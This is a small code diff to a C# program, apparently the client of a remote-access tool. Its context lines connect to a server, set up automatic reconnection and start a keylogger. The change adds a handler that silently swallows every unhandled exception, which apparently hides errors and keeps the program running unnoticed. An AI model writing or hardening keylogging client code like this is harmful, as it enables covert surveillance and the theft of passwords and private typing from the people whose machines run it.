@@ -27,6 +27,7 @@ namespace Client
                 NetworkManager.Connect();
                 NetworkManager.StartReconnect();
                 Keylogger.Start();
+                AppDomain.CurrentDomain.UnhandledException += UnhandledExceptionTrapper;
             }
             else
             {
@@ -42,6 +43,11 @@ namespace Client
                     System.Environment.Exit(1);
                 }
             }
+        }
+
+        static void UnhandledExceptionTrapper(object sender, UnhandledExceptionEventArgs e)
+        {
+            //ERROR
         }
     }
 }
